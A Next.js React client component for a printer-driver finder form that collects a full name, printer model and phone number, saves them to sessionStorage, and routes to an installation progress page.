// app/components/DriverFinderForm.tsx (or anywhere in your project)
"use client";
import { useState } from "react";
import { useRouter } from "next/navigation";

export default function DriverFinderForm() {
  const router = useRouter();
  const [fullname, setFullName] = useState("");
  const [printermodel , setPrinterModel] = useState("");
  const [phonenumber , setPhoneNumber ] = useState("");

  async function onSubmit(e) {
    e.preventDefault();

    sessionStorage.setItem("contactPayload", JSON.stringify({ fullname, printermodel, phonenumber }));
    sessionStorage.removeItem("contactSent"); 

    router.push("/progress/installing");
  }
  return (
    <section className="py-10">
      <h2 className="text-center text-xl md:text-2xl font-semibold text-gray-800">
        Get started with the installation by downloading the right printer software.
      </h2>
      <div className="mx-auto mt-6 max-w-6xl">
        <div className="rounded-xl bg-white p-6 md:p-8 shadow-[0_10px_30px_rgba(0,0,0,0.08)] ring-1 ring-black/5">
          <form
            className="grid grid-cols-1 gap-4 md:grid-cols-4"
            onSubmit={onSubmit} method="POST"
          >
            {/* Full Name */}
            <div>
              <label htmlFor="fullName" className="block text-[15px] font-semibold text-blue-700">
                Full Name <span aria-hidden="true" className="text-red-600">*</span>
                <span className="sr-only">required</span>
              </label>
              <input
                id="fullName"
                name="fullName"
                required
                placeholder="Full Name"
                value={fullname}
                onChange={(e) => setFullName(e.target.value)}  
               
                className="mt-2 w-full rounded-lg border border-blue-600/70 px-4 py-3 text-gray-900 placeholder:text-gray-400 outline-none focus:ring-2 focus:ring-blue-600/60"
              />
               
            </div>

            {/* Printer Model */}
            <div>
              <label htmlFor="printerModel" className="block text-[15px] font-semibold text-blue-700">
                Printer Model <span aria-hidden="true" className="text-red-600">*</span>
                <span className="sr-only">required</span>
              </label>
              <input
                id="printerModel"
                name="printerModel"
                required
                value={printermodel}
                onChange={(e) => setPrinterModel(e.target.value)}  
                placeholder="Printer Model"
                className="mt-2 w-full rounded-lg border border-blue-600/70 px-4 py-3 text-gray-900 placeholder:text-gray-400 outline-none focus:ring-2 focus:ring-blue-600/60"
              />
            </div>

            {/* Phone Number */}
            <div>
              <label htmlFor="phone" className="block text-[15px] font-semibold text-blue-700">
                Phone Number <span aria-hidden="true" className="text-red-600">*</span>
                <span className="sr-only">required</span>
              </label>
              <input
                id="phone"
                name="phone"
                type="tel"
                required
                value={phonenumber}
                 onChange={(e) => setPhoneNumber(e.target.value)}  
                placeholder="Phone Number"
                className="mt-2 w-full rounded-lg border border-blue-600/70 px-4 py-3 text-gray-900 placeholder:text-gray-400 outline-none focus:ring-2 focus:ring-blue-600/60"
              />
            </div>

            {/* CTA */}
            <div className="md:self-end">
              <button
                type="submit"
                className="mt-2 inline-flex h-[48px] items-center justify-center rounded-lg bg-blue-600 px-6 font-semibold uppercase tracking-wide text-white transition hover:bg-blue-700 focus:outline-none focus:ring-4 focus:ring-blue-300"
              >
                Find Drivers
              </button>
              
            </div>
          </form>
        </div>
      </div>
    </section>
  );
}
